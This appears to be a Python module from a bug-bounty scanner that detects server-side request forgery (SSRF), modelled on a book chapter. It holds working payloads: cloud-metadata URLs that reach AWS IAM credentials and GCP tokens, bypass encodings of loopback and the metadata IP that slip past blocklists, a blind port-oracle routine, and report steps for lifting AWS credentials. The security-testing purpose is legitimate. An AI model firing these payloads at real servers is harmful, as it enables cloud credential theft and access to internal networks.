"""
SSRF (Server-Side Request Forgery) detection.

From Bug Bounty Bootcamp (Li, Ch 13). Three detection layers, matching the
chapter's method:

  1. Regular SSRF (in-band): coerce the server into fetching an internal /
     cloud-metadata endpoint and detect metadata content in the response body
     (AWS IMDS, GCP, Azure, Alibaba, DigitalOcean). The signal is FETCHED
     CONTENT, never the echoed payload — so a merely-reflected URL cannot fire
     (zero false positives from an echo). Signatures are chosen so none of them
     appear in the request URLs themselves.

  2. Blind SSRF (port oracle): point the parameter at an internal host on an
     OPEN vs a CLOSED port and difference the status / timing / connect error.
     A clear differential proves the server issues the request to internal
     hosts it should not reach — even when nothing is reflected.

  3. OOB (out-of-band): inject a unique-subdomain collaborator URL. Confirmation
     happens on the collaborator, out of band, so this layer only records the
     probe (advisory) unless an interaction is later observed.

Plus SSRF-filter bypasses (Ch 13): alternate localhost spellings, IPv6, and
decimal/octal/hex encodings of 127.0.0.1 and the 169.254.169.254 metadata IP.

Pure/deterministic; unit-tested. tools._run_ssrf does the transport + timing.
"""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

# ── parameters that commonly take a URL / host (SSRF-prone) ───────
SSRF_PARAM_HINTS = (
    "url", "uri", "u", "link", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "redirect_url", "return", "returnurl", "return_url", "next",
    "continue", "target", "to", "out", "view", "file", "path", "page", "feed",
    "host", "site", "domain", "callback", "cb", "webhook", "proxy", "fetch",
    "load", "image", "img", "imageurl", "image_url", "avatar", "upload", "open",
    "data", "reference", "ref", "html", "remote", "port", "show", "resource",
)


def params_of(url: str) -> list:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def set_param(url: str, name: str, value: str) -> str:
    p = urlparse(url)
    pairs = parse_qsl(p.query, keep_blank_values=True)
    if not any(k == name for k, _ in pairs):
        pairs.append((name, value))
    else:
        pairs = [(k, value if k == name else v) for k, v in pairs]
    return urlunparse(p._replace(query=urlencode(pairs, doseq=True)))


def ssrf_params(url: str) -> list:
    """Parameters worth SSRF-testing: URL-ish ones first, else every parameter."""
    present = params_of(url)
    prone = [p for p in present if p.lower() in SSRF_PARAM_HINTS]
    return prone or present


# ── metadata / internal payloads (regular SSRF) ──────────────────
# (value, cloud). The server, if vulnerable, fetches these server-side; only its
# real cloud instance can return the signature content we look for below.
METADATA_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS"),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS"),
    ("http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token", "GCP"),
    ("http://169.254.169.254/computeMetadata/v1beta1/instance/", "GCP"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"),
    ("http://100.100.100.100/latest/meta-data/", "Alibaba"),
    ("http://169.254.169.254/metadata/v1.json", "DigitalOcean"),
]

# Content-only signatures. Deliberately NOT substrings of any payload URL above,
# so an application that merely echoes the injected URL never matches.
METADATA_SIGNATURES = {
    "AWS": ("ami-id", "instance-id", "AccessKeyId", "SecretAccessKey", "\"Code\" : \"Success\"",
            "local-hostname", "public-keys", "reservation-id", "InstanceProfileArn"),
    "GCP": ("numericProjectId", "ya29.", "\"scopes\"", "\"aliases\"", "default-credentials"),
    "Azure": ("azEnvironment", "vmId", "subscriptionId", "\"osType\""),
    "Alibaba": ("owner-account-id", "region-id", "zone-id", "instance/instance-type"),
    "DigitalOcean": ("droplet_id", "floating_ip", "\"region\"", "public_keys"),
}


def analyze_reflection(body: str, payload_value: str = "") -> dict | None:
    """Return {cloud, matched} when the response carries real metadata content.

    A signature only counts if it is NOT part of the injected URL (so echoing
    the payload back does not produce a hit)."""
    bl = body or ""
    pv = payload_value or ""
    for cloud, sigs in METADATA_SIGNATURES.items():
        hits = [s for s in sigs if s in bl and s not in pv]
        if hits:
            return {"cloud": cloud, "matched": hits[:4]}
    return None


# ── filter-bypass payloads (Ch 13: reach 127.0.0.1 / 169.254.169.254) ──
def bypass_payloads(host_port: str = "") -> list:
    """Alternate encodings/spellings of loopback + the metadata IP that defeat
    naive blocklists (string-match on '127.0.0.1' / '169.254.169.254')."""
    suffix = f":{host_port}" if host_port else ""
    return [
        f"http://127.0.0.1{suffix}/", f"http://localhost{suffix}/",
        f"http://0.0.0.0{suffix}/", f"http://[::1]{suffix}/", f"http://[::]{suffix}/",
        f"http://127.1{suffix}/", f"http://0177.0.0.1{suffix}/",
        f"http://2130706433{suffix}/", f"http://0x7f000001{suffix}/",
        "http://2852039166/", "http://0xa9fea9fe/",          # 169.254.169.254 as dword / hex
        "http://[0:0:0:0:0:ffff:169.254.169.254]/",           # IPv6-mapped metadata IP
        "http://①②⑦.⓪.⓪.①/",                                  # unicode-digit obfuscation
    ]


# ── blind SSRF port oracle ───────────────────────────────────────
def analyze_blind(open_r: dict, closed_r: dict, min_ratio: float = 3.0,
                  min_delta: float = 1.5) -> dict | None:
    """Difference the server's behavior on an OPEN vs a CLOSED internal port.

    Inputs are {status:int, error:bool, elapsed:float}. A differential means the
    parameter drives a real server-side connection (the closed port refuses/hangs
    while the open one answers). Identical behavior -> None (the param is probably
    not fetched at all), which keeps this conservative."""
    if not open_r or not closed_r:
        return None
    o_err, c_err = bool(open_r.get("error")), bool(closed_r.get("error"))
    o_status, c_status = open_r.get("status", 0), closed_r.get("status", 0)
    o_t, c_t = float(open_r.get("elapsed", 0.0)), float(closed_r.get("elapsed", 0.0))

    # 1) connect-level differential: one side answers, the other errors/hangs
    if o_err != c_err:
        answered = "closed" if o_err else "open"
        return {"kind": "connect", "confidence": "confirmed",
                "reason": f"only the {answered} port produced a clean response "
                          f"(open error={o_err}, closed error={c_err})"}
    # 2) both answered but with different HTTP status -> upstream reached, differs
    if not o_err and not c_err and o_status and c_status and o_status != c_status:
        return {"kind": "status", "confidence": "confirmed",
                "reason": f"HTTP {o_status} on the open port vs {c_status} on the closed port"}
    # 3) timing oracle: the closed port hangs to timeout while the open one is fast
    if c_t and o_t and c_t >= max(min_delta, o_t * min_ratio):
        return {"kind": "timing", "confidence": "confirmed",
                "reason": f"{o_t:.2f}s on the open port vs {c_t:.2f}s on the closed port "
                          "(closed hangs until connect timeout)"}
    return None


# ── finding builders ─────────────────────────────────────────────
def reflection_finding(url: str, param: str, payload: str, cloud: str, matched: list) -> dict:
    tgt = set_param(url, param, payload)
    return {
        "title": f"SSRF confirmed via '{param}' ({cloud} metadata)",
        "severity": "critical", "target": tgt,
        "description": (f"The parameter '{param}' causes the server to fetch an attacker-supplied URL. Pointing it at "
                        f"the {cloud} instance-metadata endpoint returned metadata content (matched: "
                        f"{', '.join(matched)}) — data that can only come from a request originating on the server to "
                        "an internal-only address."),
        "impact": ("Read cloud instance metadata and (on AWS IMDSv1) IAM role credentials, reach internal-only "
                   "services, and pivot into the private network. Metadata access typically yields temporary cloud "
                   "credentials — full account compromise."),
        "reproduction_steps": [f"Set '{param}' to {payload}",
                               f"Observe the response contains {cloud} metadata ({', '.join(matched)})",
                               "For AWS, request /latest/meta-data/iam/security-credentials/<role> to lift credentials"],
        "evidence": f"matched {cloud} metadata: {', '.join(matched)}",
        "cwe": "CWE-918", "family": "ssrf", "tags": ["ssrf"], "confidence": "confirmed",
    }


def blind_finding(url: str, param: str, open_payload: str, closed_payload: str, signal: dict) -> dict:
    return {
        "title": f"Blind SSRF via '{param}' (internal port oracle)",
        "severity": "high", "target": set_param(url, param, open_payload),
        "description": (f"The response to '{param}' differs between an internal OPEN and CLOSED port "
                        f"({signal['reason']}). This oracle proves the parameter drives a server-side request to "
                        "internal hosts, even though the fetched body is not reflected (blind SSRF)."),
        "impact": ("Port-scan and reach internal-only services behind the firewall, hit cloud metadata, and pivot — "
                   "without needing the response reflected."),
        "reproduction_steps": [f"Set '{param}' to {open_payload} (open internal port); note the response",
                               f"Set '{param}' to {closed_payload} (closed port); observe the difference "
                               f"({signal['reason']})"],
        "evidence": signal["reason"], "cwe": "CWE-918", "family": "ssrf",
        "tags": ["ssrf", "blind"], "confidence": signal.get("confidence", "confirmed"),
    }


def oob_finding(url: str, param: str, probe_url: str) -> dict:
    return {
        "title": f"SSRF OOB probe sent via '{param}'",
        "severity": "info", "target": set_param(url, param, probe_url),
        "description": (f"A unique out-of-band collaborator URL was injected into '{param}'. If your collaborator "
                        f"logs a DNS/HTTP interaction from {probe_url}, the server made a blind request — confirmed "
                        "SSRF. Check the collaborator; this probe alone is not a finding."),
        "impact": "Confirms blind SSRF when the collaborator records an interaction.",
        "reproduction_steps": [f"Set '{param}' to {probe_url}",
                               "Watch the collaborator for a DNS/HTTP hit from the target's egress IP"],
        "evidence": f"probe={probe_url}", "cwe": "CWE-918", "family": "ssrf",
        "tags": ["ssrf", "oob"], "confidence": "candidate",
    }
